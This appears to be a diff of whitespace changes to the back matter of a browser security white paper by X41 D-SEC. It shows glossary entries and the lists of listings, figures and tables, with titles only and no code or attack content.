 WebGL Web Graphics Library . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43
 
-
 X41 D-SEC GmbH                                                                                                                                                     Page 189 of 197
 Browser Security White Paper
-
-
-
 
 WebRTC Web Real Time Communication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90
 WHQL Windows Hardware Quality Lab . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 80
@@ -9250,9 +7549,6 @@ XHR XMLHttpRequest . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .
 XML Extensible Markup Language . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 30
 XSLT Extensible Stylesheet Language Transformations
 XSS Cross-site Scripting . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21
-
-
-
 
 X41 D-SEC GmbH                                                                                                                                                    Page 190 of 197
 List of Listings
@@ -9281,7 +7577,6 @@ List of Listings
 
  11.12 WASM ROP Gadgets . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 101
 
-
  12.1     Icon File SCF example . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 107
 
  12.2     Blacklisting of SCF in SafeBrowsing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 108
@@ -9302,18 +7597,12 @@ List of Listings
 
  12.10 CSP Relaxing for BeEF hook . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 126
 
-
                                                          191
 Browser Security White Paper
 
-
-
-
     12.11 Bypassing of Automated Security Checks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 127
 
-
     14.1       rowhammer PoC . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 136
-
 
     A.1        Client-side code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 178
 
@@ -9327,9 +7616,6 @@ Browser Security White Paper
 
     A.6        Shared Array Buffers + Web Workers Time-Measurement PoC . . . . . . . . . . . . . . . . . 185
 
-
-
-
 X41 D-SEC GmbH                                                                                                      Page 192 of 197
 List of Figures
 
@@ -9338,7 +7624,6 @@ List of Figures
  3.2   Edge Logical Components . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 14
 
  3.3   Internet Explorer Logical Components . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 16
-
 
  5.1   Google Chrome vuldb Prices . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 25
 
@@ -9354,11 +7639,9 @@ List of Figures
 
  5.7   Days to Patch . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 28
 
-
  6.1   Microsoft Compatibility List (via about:compat) . . . . . . . . . . . . . . . . . . . . . . . . . . . 30
 
  6.2   Legacy Dialog . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31
-
 
  7.1   Google Chrome Renderer Job Limits . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 41
 
@@ -9372,17 +7655,12 @@ List of Figures
 
  7.6   Microsoft Edge Content-Process Network Access . . . . . . . . . . . . . . . . . . . . . . . . . . 54
 
-
  8.1   Google Chrome Process Isolation Webstore . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61
 
  8.2   Google Chrome Missing Isolation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 61
 
-
                                                        193
 Browser Security White Paper
-
-
-
 
     8.3        Google Chrome Renderer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 62
 
@@ -9392,9 +7670,7 @@ Browser Security White Paper
 
     8.6        Microsoft Edge Site Isolation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 65
 
-
     9.1        Google Chrome Componenents / Win32k Abstraction . . . . . . . . . . . . . . . . . . . . . . . 78
-
 
     11.1       Chrome returning a SOP violation error . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 87
 
@@ -9402,7 +7678,6 @@ Browser Security White Paper
 
     11.3       Modifying the controlled origin content to harvest credentials confusing the victim via
                history.pushState . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 96
-
 
     12.1       Responder collecting hashes thanks to the credential leak . . . . . . . . . . . . . . . . . . . . . 107
 
@@ -9435,21 +7710,14 @@ Browser Security White Paper
 
     12.14 The malicious extension was published and ready to be installed . . . . . . . . . . . . . . . . . 127
 
-
     13.1       UI Confusion with WebUSB . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 131
-
 
     15.1       The Mixed Content prompt in Internet Explorer 7 . . . . . . . . . . . . . . . . . . . . . . . . . . 139
 
     15.2       The Mixed Content prompt in latest Microsoft browsers . . . . . . . . . . . . . . . . . . . . . . 140
 
-
-
 X41 D-SEC GmbH                                                                                                    Page 194 of 197
 Browser Security White Paper
-
-
-
 
     15.3       HTA security prompt . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 140
 
@@ -9463,7 +7731,6 @@ Browser Security White Paper
 
     15.8       Browser address bar comparison . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 144
 
-
     18.1       SHA-1 Certificate Warning in Google Chrome . . . . . . . . . . . . . . . . . . . . . . . . . . . . 158
 
     18.2       SHA-1 Warning in Microsoft Edge . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159
@@ -9471,9 +7738,6 @@ Browser Security White Paper
     18.3       SHA Warning in Internet Explorer . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 159
 
     18.4       SSL Interception in Google Chrome . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 162
-
-
-
 
 X41 D-SEC GmbH                                                                                                   Page 195 of 197
 List of Tables
@@ -9488,7 +7752,6 @@ List of Tables
 
  4.5 Image Format Support . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 20
 
-
  5.1 Google Chrome Bug Bounty Rewards . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 21
 
  5.2 Microsoft Edge Bug Bounty Rewards . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 22
@@ -9497,11 +7760,9 @@ List of Tables
 
  5.4 Pwn2Own Prices over the Years . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24
 
-
  6.1 Unregistered Websites in Compatibility List . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 31
 
  6.2 Group Policy Options . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33
-
 
  7.1 Google Chrome Main Process Sandbox . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 46
 
@@ -9521,19 +7782,12 @@ List of Tables
 
  7.9 Comparison of Sandbox Access to Resources . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 57
 
-
-
-
                                                          196
 Browser Security White Paper
-
-
-
 
     8.1 Site Isolation Results . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 60
 
     8.2 Google Chrome Experimental Process Isolation Overview . . . . . . . . . . . . . . . . . . . . . . 63
-
 
     9.1 Comparison of Hardening Features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 69
 
@@ -9543,16 +7797,13 @@ Browser Security White Paper
 
     9.4 Out-of-process JavaScript Compilation . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 79
 
-
     10.1 Adoption of Hardening Features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 83
-
 
     11.1 TCP Ports Banned by Microsoft Edge and Internet Explorer . . . . . . . . . . . . . . . . . . . . . 88
 
     11.2 TCP Ports Banned by Google Chrome . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 88
 
     11.3 Supported HTML5 Features . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 90
-
 
     12.1 Statistics of phishing sites missed and manually verified . . . . . . . . . . . . . . . . . . . . . . . . 112
 
@@ -9562,12 +7813,9 @@ Browser Security White Paper
 
     12.4 Overview of Microsoft Edge Extension Permissions . . . . . . . . . . . . . . . . . . . . . . . . . . . 120
 
-
     13.1 Comparison of Peripheral Device Support . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129
 
-
     14.1 Timer Resolution in Different Browsers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 137
-
 
     18.1 Browser User Agents . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 152
 
@@ -9584,8 +7832,5 @@ Browser Security White Paper
     18.7 Mixed Content . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 160
 
     18.8 HPKP Support . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 161
-
-
-
 
 X41 D-SEC GmbH                                                                                                   Page 197 of 197
